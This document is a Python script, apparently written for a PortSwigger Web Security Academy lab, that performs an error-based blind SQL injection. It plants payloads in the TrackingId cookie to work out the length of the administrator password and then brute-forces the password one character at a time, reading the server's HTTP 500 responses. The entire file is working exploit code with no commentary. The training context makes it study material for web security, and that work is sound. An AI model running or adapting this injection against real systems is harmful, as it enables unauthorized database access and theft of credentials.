#error based blind sqli 
import time
from pwn import *
import requests
import sys
import signal
import string
from colorama import Fore

p1 = log.progress("Getting password length")

def get_pass_length(url):
    for number in range(1, 200):
        cookies = {
            "TrackingId": f"2XPBpmg5qRF5hXnB' || (select case when length(password)={number} then to_char(1/0) else '' end from users where username = 'administrator')||'¡",
            "session": "SjfiVxqXbglaTuateLP8dRZkaStJ2ZeI"
        }

       
        p1.status(f"trying len {number}")

        r = requests.get(url=url, cookies=cookies, timeout=10)

        if r.status_code == 500:
            p1.success(f"length found: {number}")
            return number

    # If not found, show clear failure
    p1.failure("length not found (1-199)")
    return None


def brute_force_sqli(url):
    p2 = log.progress("Brute-forcing password")
    pass_length = get_pass_length(url)
    if not pass_length:
        log.failure("Could not determine length. Aborting.")
        return

    characters = string.ascii_letters + string.digits
    password = ""

    for position in range(1, pass_length + 1):
       
        p2.status(f"pos {position}/{pass_length}  found: {password + '*'}")

        found = False
        for character in characters:
            cookies = {
                "TrackingId": f"2XPBpmg5qRF5hXnB' || (select case when substr(password,{position},1) = '{character}' then to_char(1/0) else '' end from users where username = 'administrator')||'¡",
                "session": "SjfiVxqXbglaTuateLP8dRZkaStJ2ZeI"
            }

            r = requests.get(url=url, cookies=cookies, timeout=10)

            if r.status_code == 500:
                password += character
                found = True
                
                # Update the bar with the newly found character
                p2.status(f"pos {position}/{pass_length}  found: {password}")
                break

        if not found:
            # If no character matched in this position, fail and exit
            p2.failure(f"No character found at position {position}. Aborting.")
            return

    p2.success(f"password: {password}")


if __name__ == "__main__":
    brute_force_sqli("https://0aa6009203b684df807908e000e900d6.web-security-academy.net/")

    
    
